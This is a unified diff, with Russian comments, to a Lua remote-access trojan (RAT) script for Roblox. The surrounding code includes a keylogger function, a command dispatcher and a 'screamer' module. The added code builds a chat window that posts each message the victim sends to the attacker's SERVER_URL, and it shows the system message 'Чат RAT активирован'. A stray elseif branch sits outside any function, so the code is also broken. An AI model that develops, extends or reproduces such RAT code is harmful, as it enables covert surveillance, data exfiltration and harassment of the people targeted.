@@ -459,7 +459,7 @@ local function setupKeylogger()
     return success
 end
 
--- Чат-модуль (упрощенный)
+-- ЧАТ-МОДУЛЬ (ПОЛНАЯ ВЕРСИЯ)
 local function setupChat()
     local success, result = pcall(function()
         local screenGui = Instance.new("ScreenGui")
@@ -478,16 +478,110 @@ local function setupChat()
         chatFrame.Draggable = true
         chatFrame.Parent = screenGui
 
+        local scrollingFrame = Instance.new("ScrollingFrame")
+        scrollingFrame.Size = UDim2.new(1, -10, 1, -50)
+        scrollingFrame.Position = UDim2.new(0, 5, 0, 5)
+        scrollingFrame.BackgroundTransparency = 1
+        scrollingFrame.ScrollBarThickness = 5
+        scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
+        scrollingFrame.Parent = chatFrame
+
+        local textBox = Instance.new("TextBox")
+        textBox.Size = UDim2.new(1, -60, 0, 30)
+        textBox.Position = UDim2.new(0, 5, 1, -35)
+        textBox.PlaceholderText = "Сообщение..."
+        textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+        textBox.ClearTextOnFocus = false
+        textBox.Parent = chatFrame
+
+        local sendButton = Instance.new("TextButton")
+        sendButton.Size = UDim2.new(0, 50, 0, 30)
+        sendButton.Position = UDim2.new(1, -55, 1, -35)
+        sendButton.Text = "Отпр."
+        sendButton.BackgroundColor3 = Color3.fromRGB(70, 70, 90)
+        sendButton.Parent = chatFrame
+
+        local function addMessage(sender, text, isSystem)
+            local messageFrame = Instance.new("Frame")
+            messageFrame.Size = UDim2.new(1, 0, 0, 0)
+            messageFrame.AutomaticSize = Enum.AutomaticSize.Y
+            messageFrame.BackgroundTransparency = 1
+            messageFrame.Parent = scrollingFrame
+
+            local bubble = Instance.new("Frame")
+            bubble.Size = UDim2.new(0.8, 0, 0, 0)
+            bubble.AutomaticSize = Enum.AutomaticSize.Y
+            bubble.BackgroundColor3 = isSystem and Color3.fromRGB(80, 80, 100) or 
+                                    (sender == player.Name and Color3.fromRGB(0, 110, 220) or Color3.fromRGB(70, 70, 90))
+            bubble.BackgroundTransparency = 0.1
+            bubble.Parent = messageFrame
+
+            local textLabel = Instance.new("TextLabel")
+            textLabel.Size = UDim2.new(0.9, 0, 0, 0)
+            textLabel.Position = UDim2.new(0.05, 0, 0, 5)
+            textLabel.AutomaticSize = Enum.AutomaticSize.Y
+            textLabel.Text = sender..": "..text
+            textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+            textLabel.TextWrapped = true
+            textLabel.BackgroundTransparency = 1
+            textLabel.Parent = bubble
+
+            scrollingFrame.CanvasPosition = Vector2.new(0, scrollingFrame.AbsoluteCanvasSize.Y)
+            
+            if sender == player.Name and not isSystem then
+                httpRequest({
+                    Url = SERVER_URL.."/command",
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = HttpService:JSONEncode({
+                        command = "user_chat",
+                        args = {sender, text}
+                    })
+                })
+            end
+        end
+
+        local function sendMessage()
+            local text = string.gsub(textBox.Text, "^%s*(.-)%s*$", "%1")
+            if text ~= "" then
+                addMessage(player.Name, text)
+                textBox.Text = ""
+            end
+        end
+
+        textBox.FocusLost:Connect(function(enterPressed)
+            if enterPressed then sendMessage() end
+        end)
+
+        sendButton.MouseButton1Click:Connect(sendMessage)
+
+        -- Добавляем системное сообщение при создании
+        addMessage("Система", "Чат RAT активирован", true)
+
         return {
             gui = screenGui,
-            enabled = false
+            enabled = false,
+            addMessage = addMessage,
+            sendMessage = sendMessage
         }
     end)
     
     return success and result or nil
 end
 
+-- Инициализируем чат при запуске
 local chatSystem = setupChat()
+
+-- В функции ExecuteCommand исправь обработку команды chat:
+elseif cmd == "chat" then
+    if chatSystem then
+        chatSystem.gui.Enabled = not chatSystem.gui.Enabled
+        chatSystem.enabled = chatSystem.gui.Enabled
+        -- Добавляем сообщение при включении/выключении
+        if chatSystem.gui.Enabled then
+            chatSystem.addMessage("Система", "Чат включен", true)
+        end
+    end
 
 -- СКРИМЕР МОДУЛЬ -----------------------------------------------------------------
 local function createFullscreenGUI()
